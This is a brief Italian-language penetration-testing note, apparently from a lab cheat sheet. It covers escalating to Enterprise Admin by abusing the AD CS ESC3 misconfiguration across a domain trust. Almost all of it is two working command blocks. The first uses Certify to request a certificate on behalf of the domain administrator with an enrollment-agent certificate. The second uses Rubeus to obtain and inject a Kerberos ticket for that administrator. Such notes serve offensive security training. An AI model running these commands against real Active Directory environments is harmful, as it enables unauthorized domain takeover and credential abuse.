# Priv Esc - Across domain trusts - AD CS - Abusing ESC3 to EA

* Escalation a EA, convertire il certificato da .pem a .pfx  e utilizzarlo per richiedere un certificato per conto di un Enterprise Admin&#x20;

```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users
/onbehalfof:moneycorp.local\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

* Convertire il certificato da .pem a .pfx, e richiedere l'EA TGT e injectarlo

```powershell
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local
/password:SecretPass@123 /ptt
```
